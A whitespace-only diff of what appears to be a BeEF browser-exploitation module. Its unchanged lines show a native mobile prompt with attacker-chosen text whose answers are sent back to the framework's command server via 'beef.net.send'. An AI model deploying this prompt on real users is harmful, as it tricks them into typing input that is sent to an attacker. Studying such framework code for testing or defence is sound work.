@@ -13,17 +13,17 @@ beef.execute(function() {
     var ans_no = "<%== @ans_no %>";
     var result = '';
 
-   
+
     function onPrompt(results) {
         result = "Selected button number " + results.buttonIndex + " result: " + results.input1;
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
     }
 
     navigator.notification.prompt(
         question,
-        onPrompt,      
-        title,         
+        onPrompt,
+        title,
         [ans_yes,ans_no]
     );
-  
+
 });
